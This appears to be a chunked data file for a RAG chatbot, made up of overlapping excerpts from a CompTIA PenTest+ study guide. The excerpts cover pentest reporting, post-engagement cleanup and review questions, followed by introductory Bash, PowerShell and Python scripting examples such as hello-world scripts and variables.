involves handling sensitive information and navigating complex regulatory environments. The report must comply with all applicable laws and regulations, including data protection laws, industry‐ specific regulations, and contractual obligations. For instance, if the penetration test is conducted in a jurisdiction with strict data privacy laws, the report must ensure that no sensitive personal data is inadvertently disclosed. Additionally, the report should be clear about the legal context in which the test was conducted. This includes documenting any legal authorizations, such as consent from the client to perform the test,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	significant legal, ethical, and operational implications. Legal Considerations Penetration testing often involves handling sensitive information and navigating complex regulatory environments. The report must comply with all applicable laws and regulations, including data protection laws, industry‐ specific regulations, and contractual obligations. For instance, if the penetration test is conducted in a jurisdiction with strict data privacy laws, the report must ensure that no sensitive personal data is inadvertently disclosed. Additionally, the report should be clear about the legal context in which the test was conducted. This includes documenting any legal authorizations, such as consent from the client to perform the test, and detailing any legal constraints that were in place. The report should also include disclaimers to protect the testing organization from liability, especially in cases where the report might be used as evidence in legal proceedings. By carefully considering these legal aspects, you ensure that the report can help safeguard both you and the client against potential legal risks. Ethical Considerations Ethical considerations are equally important in the reporting process. The penetration tester has a responsibility to conduct their work with integrity and to ensure that the findings are presented truthfully and without bias. This means that the report should accurately reflect the results of the test, without exaggerating the severity of vulnerabilities or downplaying the risks. Ethical reporting also involves respecting the privacy and confidentiality of all stakeholders. The report should be written in a way that minimizes the exposure of sensitive information and respects the privacy of individuals who may be affected by the findings. For example, if the test reveals vulnerabilities related to specific users, their identities should be anonymized in the report unless there is a compelling reason to disclose them. Furthermore, ethical considerations extend to the recommendations provided. The advice given should be in the best interest of the client and should not be influenced by any conflicts of interest. Penetration testers should avoid recommending solutions or vendors based on personal or financial incentives and should instead focus on what is genuinely best for the client's security needs. Quality Control (QC) Quality control is a critical aspect of the reporting process. A penetration testing report is only as valuable as its accuracy, clarity, and reliability. To ensure high quality, the report should undergo thorough reviews before being delivered to the client. This includes technical reviews to verify the accuracy of the findings, as well as editorial reviews to ensure that the report is clear, concise, and free of errors. The QC process should also involve peer reviews, where other security professionals examine the report to provide an additional layer of scrutiny. These reviews help catch any mistakes or oversights and ensure that the report meets the highest standards of quality. Additionally, the report should be checked against the client's expectations and the agreed‐upon scope of work to ensure that it fulfills all contractual obligations. Quality control is not just about catching mistakes; it's also about enhancing the value of the report. By ensuring that the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	editorial reviews to ensure that the report is clear, concise, and free of errors. The QC process should also involve peer reviews, where other security professionals examine the report to provide an additional layer of scrutiny. These reviews help catch any mistakes or oversights and ensure that the report meets the highest standards of quality. Additionally, the report should be checked against the client's expectations and the agreed‐upon scope of work to ensure that it fulfills all contractual obligations. Quality control is not just about catching mistakes; it's also about enhancing the value of the report. By ensuring that the report is well organized, easy to understand, and actionable, the QC process helps ensure that the client can effectively use the findings to improve their security posture. Artificial Intelligence (AI) in Reporting Penetration testers are now commonly using artificial intelligence (AI) to assist with report writing, bringing both opportunities and challenges. AI can be used to automate parts of the reporting process, such as analyzing scan results, identifying patterns in vulnerabilities, and even generating preliminary drafts of the report. These AI‐driven tools can save time and improve the consistency of reports, allowing penetration testers to focus on more complex and strategic aspects of the engagement. However, the use of AI in reporting also raises important considerations. First, you must ensure that AI‐generated content is accurate and free from bias. While AI can assist in the reporting process, it should not replace the critical thinking and expertise of a human tester. All AI‐generated content should be carefully reviewed and validated by a qualified security professional before being included in the final report. Additionally, the use of AI in reporting should be transparent. If AI tools were used to generate parts of the report, this should be disclosed to the client, along with any limitations of the AI's capabilities. This transparency helps maintain trust and ensures that the client understands how the report was produced. Secure Handling and Distribution of Reports Penetration testing reports often contain extremely sensitive information about an organization. The Methodology section of the report contains the detailed steps that the testers followed to compromise the organization's security. Those instructions could serve as a road map for an attacker seeking to gain access to the organization. Discovering a copy of a penetration testing report is the ultimate win for an attacker conducting reconnaissance of an organization! It is, therefore, extremely important that anyone with access to the penetration testing report handle it securely. Reports should only be transmitted and stored in encrypted form, and paper copies should be kept under lock and key. Digital and paper copies of the report should be securely destroyed when they are no longer necessary. The penetration testing agreement should clearly specify the storage time for the report. Although the client may choose to retain a copy of the report indefinitely, the penetration testers should retain the report and related records only for a sufficient length of time to answer any client questions. When
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	extremely important that anyone with access to the penetration testing report handle it securely. Reports should only be transmitted and stored in encrypted form, and paper copies should be kept under lock and key. Digital and paper copies of the report should be securely destroyed when they are no longer necessary. The penetration testing agreement should clearly specify the storage time for the report. Although the client may choose to retain a copy of the report indefinitely, the penetration testers should retain the report and related records only for a sufficient length of time to answer any client questions. When this period of time expires, the report should be securely deleted. Wrapping Up the Engagement The delivery of a penetration testing report is certainly a major milestone in the engagement, and clients often consider it the end of the project. However, the work of a penetration tester isn't concluded simply because they've delivered a report. Testers must complete important post‐report delivery activities before closing out the project. Post‐Engagement Cleanup Penetration testers use a wide variety of tools and techniques as they work their way through a client network. These activities often leave behind remnants that may themselves compromise security by their very presence. During the engagement, testers should clearly document any changes they make to systems, and they should revisit that documentation at the conclusion of the test to ensure that they completely remove any traces of their work. CompTIA highlights several important post‐engagement cleanup activities: Removing command shells and other persistence mechanisms installed on systems during the penetration test Reverting any configuration changes made to systems and applications during the penetration test Removing tester‐created accounts, credentials, or backdoors installed during the test Removing any tools installed during the penetration test Spinning down any infrastructure created during the test Preserving any artifacts of the test that the client wishes to retain Securely destroy any data no longer needed after the test Of course, these activities are just a starting point. The basic principle that testers should follow when conducting post‐engagement cleanup is that they should restore the system to its original, pre‐test state. The exception to this rule is that testers may have made emergency changes to assist with the remediation of critical vulnerabilities. If this occurred, testers should coordinate with management and determine appropriate actions. Client Acceptance You should obtain formal client acceptance of your deliverables. This may simply be a written acknowledgment of your final report, but it more typically includes a face‐to‐face meeting where the testers discuss the results of the engagement with business and technical leaders and answer any questions that might arise. Client acceptance marks the end of the client engagement and is the formal agreement that the testers successfully completed the agreed‐upon scope of work. Lessons Learned Whether a team conducts one penetration test each year or several per week, there's always something to learn from the process itself. The lessons learned session is the team's opportunity to get together and discuss the testing
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	be a written acknowledgment of your final report, but it more typically includes a face‐to‐face meeting where the testers discuss the results of the engagement with business and technical leaders and answer any questions that might arise. Client acceptance marks the end of the client engagement and is the formal agreement that the testers successfully completed the agreed‐upon scope of work. Lessons Learned Whether a team conducts one penetration test each year or several per week, there's always something to learn from the process itself. The lessons learned session is the team's opportunity to get together and discuss the testing process and results without the client present. Team members should speak freely about the test and offer any suggestions they might have for improvement. The lessons learned session is a good opportunity to highlight any innovative techniques used during the test that might be used in future engagements. It's often helpful to have a third party moderate the lessons learned session. This provides a neutral facilitator who can approach the results from a purely objective point of view without any attachment to the work. The facilitator can also help draw out details that might be obvious to the team but that would be helpful to an outside reader reviewing the results of the lessons learned session. Follow‐Up Actions/Retesting In some cases, the client may wish to have the team conduct follow‐up actions after a penetration testing engagement. This may include conducting additional tests using different tools or on different resources than were included in the scope of the original test. Follow‐up actions may also include retesting resources that had vulnerabilities during the original test to verify that remediation activities were effective. The nature of follow‐up actions may vary, and testers should make a judgment call about the level of formality involved. If the client is requesting a quick retest that falls within the original scope of work and rules of engagement, the testers may choose to simply conduct the retest at no charge. If, however, the client is requesting significant work or changes to the scope or rules of engagement, the testers may ask the client to go through a new planning process. Attestation of Findings If the client conducted the test as part of a regulatory or contractual commitment, they may request that the tester prepare a formal attestation of their work and findings. The level of detail included in this attestation will depend on the purpose of the request and should be discussed between the client and the tester. It may be as simple as a short letter confirming that the client engaged the tester for a penetration test, or it may require a listing of high‐risk findings along with confirmation that the findings were successfully remediated after the test. Retention and Destruction of Data The statement of work for a penetration testing engagement should include clear statements about data retention and destruction. At the conclusion of the engagement, testers should carefully observe these requirements. If the client
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	in this attestation will depend on the purpose of the request and should be discussed between the client and the tester. It may be as simple as a short letter confirming that the client engaged the tester for a penetration test, or it may require a listing of high‐risk findings along with confirmation that the findings were successfully remediated after the test. Retention and Destruction of Data The statement of work for a penetration testing engagement should include clear statements about data retention and destruction. At the conclusion of the engagement, testers should carefully observe these requirements. If the client wants any data retained, testers should carefully preserve that data in the prescribed manner. This may include preserving artifacts of the test that the client and/or testers may reference in the future. Otherwise, any data remaining from the test that is no longer needed should be securely destroyed in a prompt manner. Summary Communication is crucial to the effective performance of any penetration test. Testers and clients must develop a clear statement of work during the planning phase of the test and then continue to communicate effectively with one another throughout the engagement. The rules of engagement for the test should define a consistent path of communication and identify the milestones where regular communication will take place, as well as the triggers for emergency communications. The penetration testing report is the final work product that serves as an artifact of the test and communicates the methodology, findings, recommended remediations, and conclusions to management. The report should also include an Executive Summary written in plain language that is accessible to nontechnical leaders, helping them understand the purpose and results of the test as well as the risk facing the organization. Exam Essentials Know that penetration testers should establish a regular pattern of communication with management. This communication should include regular meetings where the testers share progress and, when appropriate, interim results. The communication process should also define triggers that may require immediate notification of management. Common communication triggers include the identification of critical findings and the discovery of indications of prior compromise. Be able to detail what penetration testing reports should include regarding recommended mitigation strategies. Testers should define remediation strategies that include people, process, and technology controls designed to correct or mitigate the risks discovered during the penetration test. This serves as a road map that management may follow when prioritizing risk remediation activities. Understand appropriate remediation activities for common findings. Shared accounts may be remediated through the use of randomized credentials and a local administrator password solution. Weak passwords may be remediated through the use of minimum password requirements and password filters. Plain‐text passwords should be encrypted or hashed. Organizations not using multifactor authentication should adopt additional authentication methods. SQL injection vulnerabilities may be remediated through the use of input validation and parameterized queries. Unnecessary open services should be closed as part of system hardening activities. Be able to describe the purpose of penetration testing reports. The Executive Summary
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	prioritizing risk remediation activities. Understand appropriate remediation activities for common findings. Shared accounts may be remediated through the use of randomized credentials and a local administrator password solution. Weak passwords may be remediated through the use of minimum password requirements and password filters. Plain‐text passwords should be encrypted or hashed. Organizations not using multifactor authentication should adopt additional authentication methods. SQL injection vulnerabilities may be remediated through the use of input validation and parameterized queries. Unnecessary open services should be closed as part of system hardening activities. Be able to describe the purpose of penetration testing reports. The Executive Summary presents a brief description of the test and its findings. The Methodology section of the report should provide an educated professional with the information necessary to reproduce the test results. The Detailed Findings section provides technical details on the test results as well as recommended mitigation actions. The Attack Narrative section describes how the penetration tester gained access and moved through the system. The Recommendations and Remediation Guidance section offers actionable steps for mitigating identified risks and improving the organization's security posture. The Test Limitations and Assumptions section outlines the constraints and expectations under which the test was conducted, helping to frame the context of the findings. Finally, the report Conclusion ties together the information presented in the report and puts it in the context of the organization's risk appetite. Post‐engagement activities ensure that loose ends are tied up. Conduct post‐engagement cleanup. At the conclusion of a penetration test, testers should conduct post‐ engagement cleanup to remove traces of their activity. They should ensure that they have formal client acceptance of their results and conduct a lessons learned session. Lab Exercises Activity 11.1: Remediation Strategies In this and the next exercise, you will finish the work on the MCDS, LLC, penetration test that you have been conducting throughout the scenarios and lab exercises in this book. Review the results of the penetration test by reviewing the scenarios in each chapter as well as the results of your lab exercises. Make a concise list of your findings based on the results of the testing. Identify one or more remediation strategies for each of the findings. Be sure to indicate whether each strategy represents a people, process, and/or technology control. Prioritize your recommended remediation actions based on the level of risk reduction you expect each action to provide. Activity 11.2: Report Writing Create a report based on the findings of the MCDS penetration test. You should include the following sections in your report: Executive Summary Methodology Detailed Findings Attack Narrative Recommendations and Remediation Guidance Test Limitations and Assumptions Conclusion Appendix Remember that the penetration test was conducted in response to a cybersecurity incident that occurred at MCDS. Include the results of forensic testing tools and other technologies that you used during the course of your testing. Review Questions You can find the answers in the Appendix A. 1. Tom recently conducted a penetration test for a company that is regulated under PCI
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Create a report based on the findings of the MCDS penetration test. You should include the following sections in your report: Executive Summary Methodology Detailed Findings Attack Narrative Recommendations and Remediation Guidance Test Limitations and Assumptions Conclusion Appendix Remember that the penetration test was conducted in response to a cybersecurity incident that occurred at MCDS. Include the results of forensic testing tools and other technologies that you used during the course of your testing. Review Questions You can find the answers in the Appendix A. 1. Tom recently conducted a penetration test for a company that is regulated under PCI DSS. Two months after the test, the client asks for a letter documenting the test results for its compliance files. What type of report is the client requesting? A. Executive summary B. Penetration testing report C. Written testimony D. Attestation of findings 2. Wendy is reviewing the results of a penetration test and learns that her organization uses the same local administrator password on all systems. Which one of the following tools can help her resolve this issue? A. LAPS B. Nmap C. Nessus D. Metasploit 3. Which one of the following is not a normal communication trigger for a penetration test? A. Discovery of a critical finding B. Completion of a testing stage C. Documentation of a new test D. Identification of prior compromise 4. Gary ran an Nmap scan of a system and discovered that it is listening on port 22 despite the fact that it should not be accepting SSH connections. What finding should he report? A. Shared local administrator credentials B. Unnecessary open services C. SQL injection vulnerability D. No multifactor authentication 5. Tom's organization currently uses password‐based authentication and would like to move to multifactor authentication. Which one of the following is an acceptable second factor? A. Security question B. PIN C. Smartphone app D. Passphrase 6. Which one of the following items is not appropriate for the executive summary of a penetration testing report? A. Description of findings B. Statement of risk C. Plain language D. Technical detail 7. Which one of the following activities is not commonly performed during the post‐engagement cleanup phase? A. Remediation of vulnerabilities B. Removal of shells C. Removal of tester‐created credentials D. Removal of tools 8. Who is the most effective person to facilitate a lessons learned session after a penetration test? A. Team leader B. CIO C. Third party D. Client 9. Which one of the following is not an example of an operational control that might be implemented to remediate an issue discovered during a penetration test? A. Job rotation B. Time‐of‐day login restrictions C. Network segmentation D. User training 10. Which one of the following techniques is not an appropriate remediation activity for a SQL injection vulnerability? A. Network firewall B. Input sanitization C. Input validation D. Parameterized queries 11. When should system hardening activities take place? A. When the system is initially built B. When the system is initially built and periodically during its
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Third party D. Client 9. Which one of the following is not an example of an operational control that might be implemented to remediate an issue discovered during a penetration test? A. Job rotation B. Time‐of‐day login restrictions C. Network segmentation D. User training 10. Which one of the following techniques is not an appropriate remediation activity for a SQL injection vulnerability? A. Network firewall B. Input sanitization C. Input validation D. Parameterized queries 11. When should system hardening activities take place? A. When the system is initially built B. When the system is initially built and periodically during its life C. When the system is initially built and when it is decommissioned D. When the system is initially built, periodically during its life, and when it is decommissioned 12. Biometric authentication technology fits into what multifactor authentication category? A. Something you know B. Something you are C. Somewhere you are D. Something you have Chapter 12 Scripting for Penetration Testing THE COMPTIA PENTEST+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: Domain 2: Reconnaissance and Enumeration 2.3 Given a scenario, modify scripts for reconnaissance and enumeration. Information gathering Data manipulation Scripting languages Bash Python PowerShell Logic constructs Loops Conditions Boolean operator String operator Arithmetic operator Use of libraries, functions, and classes Domain 4: Attacks and Exploits 4.10 Given a scenario, use scripting to automate attacks. PowerShell Empire/PowerSploit PowerView PowerUpSQL AD search Bash Input/output management Data manipulation Python Impacket Scapy Breach and attack simulation (BAS) Caldera Infection Monkey Atomic Red Team Penetration testing is full of tedious work. From scanning large networks to brute‐force testing of web application credentials, penetration testers often use extremely repetitive processes to achieve their goals. Done manually, this work would be so time‐consuming and mind‐numbing that it would be virtually impossible to execute. Fortunately, scripting languages provide a means to automate these repetitive tasks. Penetration testers do not need to be software engineers. Generally speaking, pentesters don't write extremely lengthy code or develop applications that will be used by many other people. The primary development skill that a penetration tester should acquire is the ability to read fairly simple scripts written in a variety of common languages and adapt them to their own unique needs. That's what we'll explore in this chapter. Real World Scenario Scripting Throughout this book, you've been following along with the penetration test of a fictional company: MCDS, LLC. In this chapter and its lab activities, we'll analyze scripts designed to assist with different phases of this penetration test. Here are their goals: Run a port scan of a large network and save the results into individual files for each address scanned. Perform reverse DNS queries to obtain information about a block of IP addresses. Scripting and Penetration Testing Let's begin by taking a look at three scripting languages that are commonly used by penetration testers. You'll want to choose the right language for each penetration‐testing task that you face by considering several important criteria: Standards within your organization Operating system(s) of
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and its lab activities, we'll analyze scripts designed to assist with different phases of this penetration test. Here are their goals: Run a port scan of a large network and save the results into individual files for each address scanned. Perform reverse DNS queries to obtain information about a block of IP addresses. Scripting and Penetration Testing Let's begin by taking a look at three scripting languages that are commonly used by penetration testers. You'll want to choose the right language for each penetration‐testing task that you face by considering several important criteria: Standards within your organization Operating system(s) of the devices that will run the scripts you create Availability of libraries and packages that support your work Personal preference The three languages used during penetration tests and covered on the PenTest+ exam are Bash, PowerShell, and Python. We'll begin our explorations of these languages by writing a simple “Hello, world!” script in each language. “Hello, world!” is the first script that most developers write when exploring a new language. It simply prints that phrase on the screen when it is run. It's a useful exercise to make sure that you're set up and running properly. Bash The Bourne‐again shell (Bash) is a scripting language commonly used on Linux and macOS systems. It's often the default environment available at the command line on those systems. As a Unix shell, Bash provides command‐line access for administrators to work with system resources. Administrators can also write text files containing commonly used Bash commands to allow their reuse. These text files are also known as Bash scripts. The first line of a Bash script indicates the path to the Bash shell on your local system. The shell is usually located in the /bin/ directory, so the first line of your Bash script should read: #!/bin/bash This simply tells the operating system that when someone tries to execute the file, it should use the Bash shell to carry out the commands that it contains. After this line, you may begin writing the code for your Bash script. In our example, we want to print the words “Hello, world!” We can do this with the echo command: echo "Hello, world!" Using the text editor of your choice, you can create this simple script containing the following two lines: #!/bin/bash echo "Hello, world!" By convention, you should save your Bash scripts with the .sh file extension. For example, we might save this one as hello.sh. Before you can run your script, you need to tell the operating system that it is an executable file. You can do that using this command: chmod u+x hello.sh In this case, the chmod command changes the permissions of the hello.sh file; the u+x argument says to add the execute permission for the owner of the file. Once you've done that, execute your script using this command: ./hello.sh You'll then see the following output: Hello, world! That's all there is to writing a simple script in the Bash shell. PowerShell PowerShell
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	For example, we might save this one as hello.sh. Before you can run your script, you need to tell the operating system that it is an executable file. You can do that using this command: chmod u+x hello.sh In this case, the chmod command changes the permissions of the hello.sh file; the u+x argument says to add the execute permission for the owner of the file. Once you've done that, execute your script using this command: ./hello.sh You'll then see the following output: Hello, world! That's all there is to writing a simple script in the Bash shell. PowerShell PowerShell (PS) is another command shell scripting language, very similar to Bash. It was originally designed by Microsoft for use by Windows system administrators and is now an open source tool available for Windows, macOS, and Linux platforms. However, given the availability of other Unix shells for macOS and Linux systems, PowerShell is still generally associated with the Windows operating system. The most common use case for running PowerShell on non‐Windows systems is for code compatibility. You'll find PowerShell preinstalled on Windows systems. To create our “Hello, world!” script in PowerShell, you need just a single line of code: Write-Host "Hello, world!" Save your script in a directory on your system using the text editor of your choice. By convention, developers name PowerShell scripts using the .ps1 extension. Once you've saved your script, try to run it using this command: .\hello.ps1 If you haven't used PowerShell scripts on your system before, when you try to execute your first script, you'll probably see an error message that reads as follows: .\hello.ps1 : File C:\Users\Administrator\hello.ps1 cannot be loaded. The file C:\Users\Administrator\hello.ps1 is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170. At line:1 char:1 + .\hello.ps1 + ~~~~~~~~~~~ + CategoryInfo : SecurityError: (:) [], PSSecurityException + FullyQualifiedErrorId : UnauthorizedAccess This error occurs because Windows systems are configured by default to block the execution of PowerShell scripts. You'll need to change the PowerShell execution policy to allow them to run. There are five possible policies: Restricted is the default PowerShell execution policy, and it blocks all use of PowerShell scripts. AllSigned requires that any PowerShell scripts that you run are digitally signed by a trusted publisher. RemoteSigned allows the execution of any PowerShell script that you write on the local machine but requires that scripts downloaded from the Internet be signed by a trusted publisher. Unrestricted allows the execution of any PowerShell script but prompts you to confirm your request before allowing you to run a script downloaded from the Internet. Bypass allows the execution of any PowerShell script and does not produce any warnings for scripts downloaded from the Internet. You aren't a trusted publisher, so you should set the execution policy to RemoteSigned to allow you to run your own scripts but still require that downloaded scripts come from a trusted publisher. You can change
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	on the local machine but requires that scripts downloaded from the Internet be signed by a trusted publisher. Unrestricted allows the execution of any PowerShell script but prompts you to confirm your request before allowing you to run a script downloaded from the Internet. Bypass allows the execution of any PowerShell script and does not produce any warnings for scripts downloaded from the Internet. You aren't a trusted publisher, so you should set the execution policy to RemoteSigned to allow you to run your own scripts but still require that downloaded scripts come from a trusted publisher. You can change the execution policy using this command: Set-ExecutionPolicy RemoteSigned Note that you must start PowerShell as an administrator to change the execution policy. Once you've corrected this, try running the script again and you should see this output: Hello, world! You've now written “Hello, world!” in PowerShell. That's two languages down and one to go! One of the most important things you can do as you prepare for the exam is to learn to recognize the syntax used in Bash, PowerShell, and Python scripts. You won't be asked to write code on the exam, but you may be asked to identify the language used in a script or interpret code that someone else wrote. One easy way you can do this is to watch out for the commands used to print output. They're different in all of the languages covered by the PenTest+ exam. Python Python is arguably the most popular programming language used by developers today. Python is a general‐purpose programming language and is also an interpreted language. Indentation is extremely important in Python. Although many languages allow you to indent (or not!) code freely, indentation has a specific purpose in Python: It's used to group statements together. If you indent improperly, your code is likely to behave in an unexpected way. We can print output in Python using the print command. Here's the single line of code that we need to create our “Hello, world!” script: print("Hello, world!") If we save that in the current working directory as hello.py, we can then execute it with the following command: python ./hello.py And, for one last time, we'll see our output: Hello, world! In our code, the ./ in the command indicates that the file is saved in the current working directory. If it is saved somewhere else on your system, substitute the full path to the file. Variables, Arrays, and Substitutions Variables are one of the core concepts in any scripting language. They allow developers to store information in memory using a descriptive name and then later reference that information in their script. Variables can store integers, decimal numbers, Boolean (TRUE/FALSE) values, dates and times, character strings, and virtually any other type of information that you might need. Let's take a look at using a variable in some pseudocode. Imagine that we have a small store that normally sells cupcakes for $2 but offers a 50 percent discount on Tuesdays.
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	substitute the full path to the file. Variables, Arrays, and Substitutions Variables are one of the core concepts in any scripting language. They allow developers to store information in memory using a descriptive name and then later reference that information in their script. Variables can store integers, decimal numbers, Boolean (TRUE/FALSE) values, dates and times, character strings, and virtually any other type of information that you might need. Let's take a look at using a variable in some pseudocode. Imagine that we have a small store that normally sells cupcakes for $2 but offers a 50 percent discount on Tuesdays. We might need a script that calculates Tuesday's price, like this one: cupcake_price = 2.00 cupcake_price = cupcake_price / 2 print "The price of a cupcake is $", cupcake_price In this script, cupcake_price is a variable. The first line of the script sets the value of that variable equal to 2.00. The next line changes the price to one‐half of its current value. The last line prints the price of the cupcake, which will be $1.00 on Tuesday. That's a simple example of a variable in action. Remember, when we execute a script containing a variable, the script interpreter performs a substitution, using the value stored in that variable's memory location in place of the variable name. In some cases, we need to keep track of many related variables at the same time. For example, we might have the ages of all students in a high school programming class. We might create a separate variable to keep track of each student's age, but that would make things very complicated. We'd have to remember the names of all those variables. Arrays offer a helpful way to store that information together. For example, let's create an array called ages using this code: ages = [16,15,18,15,16,14,13,17,13,14] This code creates an array with 10 elements, each one corresponding to the age of a single student. We can pull out individual values from the array and inspect them or manipulate them. For example, if we want to access the first element in the array, we can use this code, which would give us the value 16: ages[0] When programmers count elements in an array, they usually begin with 0 instead of 1. This means that a 10‐element array has elements numbered 0 through 9. This is the case for any scripting language that uses zero‐indexing, as all three of the languages discussed in this book do. On our first student's birthday, we could increment that student's age with the following command: ages[0] = 17 That changes a single element of the array. Alternatively, if we wanted to add 1 to all of the students' ages, we could use this command to perform a simple arithmetic operation: ages = ages + 1 This would result in an array with the values [17,16,19,16,17,15,14,18,14,15]. Some programming languages use the concept of lists to either replace or supplement arrays. Lists are closely related to arrays but may have some
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	as all three of the languages discussed in this book do. On our first student's birthday, we could increment that student's age with the following command: ages[0] = 17 That changes a single element of the array. Alternatively, if we wanted to add 1 to all of the students' ages, we could use this command to perform a simple arithmetic operation: ages = ages + 1 This would result in an array with the values [17,16,19,16,17,15,14,18,14,15]. Some programming languages use the concept of lists to either replace or supplement arrays. Lists are closely related to arrays but may have some differences in implementation. For example, in Python, all of the elements in an array must be of the same data type, whereas the elements of a list may have different data types. Variables and arrays are core concepts in programming. Let's take a look at how we use them in each of our three programming languages. Bash In Bash scripts, you may create a variable simply by assigning a value to that variable with the = operator. You may then reference the value stored in that variable using the $ operator before the variable name. There are no variable types in Bash, so you don't need to worry about defining whether a variable contains a string, a number, or some other type of data. The interpreter will figure it out for you. Here's our cupcake script written in Bash: #!/bin/bash cupcakeprice=2 cupcakeprice=$(( cupcakeprice / 2 )) echo The price of a cupcake is $cupcakeprice When we run this code, we get the following result: The price of a cupcake is 1 You'll notice that the syntax in Bash is a little cumbersome. We use the double‐parentheses operators—(( and ))—to tell Bash that we're performing a calculation, in this case to divide the price of a cupcake by 2. You can create arrays in Bash by placing the data within single parentheses. For example, here's a short Bash script that creates the ages array described earlier and then retrieves the age of the third person in the dataset: #!/bin/bash ages=(17 16 19 16 17 15 14 18 14 15) echo 'The third age is: ' ${ages[2]} This code produces the following output: The third age is: 19 Notice the somewhat strange syntax in the final line of the script. Bash makes it a little complicated to reference an array element, requiring that you place the array reference inside curly braces, {}. This obscure syntax is one of many reasons that developers tend to switch to a more advanced language and use Bash only for quick‐and‐dirty jobs. PowerShell PowerShell is much simpler in the way that you declare and use variables. All you need to do is remember to precede the variable name with a $ whenever you use it, whether you're setting, changing, or retrieving the value stored in that variable. Here's our cupcake price script in PowerShell: $cupcake_price = 2.00 $cupcake_price = $cupcake_price / 2 Write-Host "The price of a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	that you place the array reference inside curly braces, {}. This obscure syntax is one of many reasons that developers tend to switch to a more advanced language and use Bash only for quick‐and‐dirty jobs. PowerShell PowerShell is much simpler in the way that you declare and use variables. All you need to do is remember to precede the variable name with a $ whenever you use it, whether you're setting, changing, or retrieving the value stored in that variable. Here's our cupcake price script in PowerShell: $cupcake_price = 2.00 $cupcake_price = $cupcake_price / 2 Write-Host "The price of a cupcake is" $cupcake_price Unlike Bash, PowerShell does use the concept of data types, but you generally won't need to worry about it for simple scripts. When you create a variable, PowerShell will guess the appropriate variable type based on the context of your code. That approach is more than sufficient for the PenTest+ exam. Let's now turn to an array example in PowerShell. We create an array just as we would a normal variable, but we provide multiple values instead of a single value and separate those multiple values with commas. We can then access an array element by using the array name and then placing the index we'd like to reference in square brackets. This syntax is similar to what we saw in Bash, but a little simpler because the curly braces aren't required. Here's the code to create an array of ages and then access the third element in that array: $ages=17,16,19,16,17,15,14,18,14,15 Write-Host 'The third age is: ' $ages[2] Python Python allows us to declare a variable and automatically chooses the appropriate data type. We don't need to use a $ or other special characters to refer to variable values. Here's the cupcake pricing script in Python: cupcake_price = 2.00 cupcake_price = cupcake_price / 2 print('The price of a cupcake is ', cupcake_price) Like PowerShell, Python does have variable types, but it will guess the appropriate variable type for your data based on the context of your code. For example, here Python infers that cupcake_price is numeric because it is assigned a decimal value at creation. Arrays in Python work very similarly to those in the other languages we've discussed. We create an array by placing a list of comma‐separated values inside square brackets, [], and then access an array element by placing its integer index inside square brackets after the array name. Here's our age script translated into Python using Python's print function: ages=[17,16,19,16,17,15,14,18,14,15] print('The third age is: ', ages[2]) Comparison Operations Once we have values stored in variables, we'll often want to perform comparisons on those values to determine whether two variables have the same or different values. For example, we might want to check if one student is older than another student. Similarly, we might want to compare a variable to a constant value to check, for example, whether a student is over the age of 18. We perform these comparisons using specialized comparison operators,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	brackets after the array name. Here's our age script translated into Python using Python's print function: ages=[17,16,19,16,17,15,14,18,14,15] print('The third age is: ', ages[2]) Comparison Operations Once we have values stored in variables, we'll often want to perform comparisons on those values to determine whether two variables have the same or different values. For example, we might want to check if one student is older than another student. Similarly, we might want to compare a variable to a constant value to check, for example, whether a student is over the age of 18. We perform these comparisons using specialized comparison operators, as shown in the following table. Comparison operation Bash PowerShell Python Equality –eq –eq == Less than –lt –lt < Less than or equal to –le –le <= Greater than –gt Greater than or equal to –ge Not equal –ne –gt > –ge >= –ne != The examples in the table perform the specified comparison on two variables, x and y, in that order. For example, x <= y checks to see if x is less than or equal to y. Note that the comparison operators for Bash and PowerShell are the same. You'll see examples of these comparison operators used in the code examples throughout the remainder of this chapter. String Operations In addition to basic comparisons, developers writing scripts must often manipulate strings in other ways. Concatenation is the most common string operation; it allows the developer to combine two strings together. For example, imagine that we have the following variables: first = "Mike" last = "Chapple" We might want to combine these names into a single string to make it easier to manipulate. We can do this by concatenating the two strings. Here's some pseudocode using the + operator for concatenation: name = first + last This would result in the following value: MikeChapple Of course, we'd like a space in between those values, so we can just concatenate it into the string: name = first + " " + last which would result in the value: Mike Chapple We also might need to concatenate a string and an integer together. Here's some pseudocode that performs string and integer concatenation by first converting the integer to a string: prefix = "His age is " age = 14 statement = prefix + string(age) This would result in the value: His age is 14 We'll walk through examples of string/string and string/integer concatenation in each language later in the following sections. Another common string operation is encoding and decoding strings for use in URLs. There are many values that can't be passed within a URL as is, so they must be converted to a different form using a procedure known as percent encoding. For example, spaces cannot be included in a URL because they would be interpreted as the end of the URL. So, URL encoding replaces spaces with the percent code %20. Similarly, ampersands are used to separate variables in a URL query string, so they may not
